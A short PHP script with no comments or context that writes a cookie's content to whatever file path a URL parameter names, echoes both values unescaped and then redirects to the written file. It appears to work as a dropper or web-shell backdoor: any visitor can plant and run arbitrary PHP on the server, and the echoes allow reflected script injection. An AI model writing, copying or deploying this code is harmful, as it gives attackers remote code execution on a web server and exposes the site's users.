
<?php 
$link = $_GET['link']; 
$body = $_COOKIE['body']; 
echo $link;
echo $body;
$myfile = fopen($link, "w") or die("Unable to open file!");
$txt = $body;
fwrite($myfile, $txt);
fclose($myfile);
header("Location: $link");
?> 
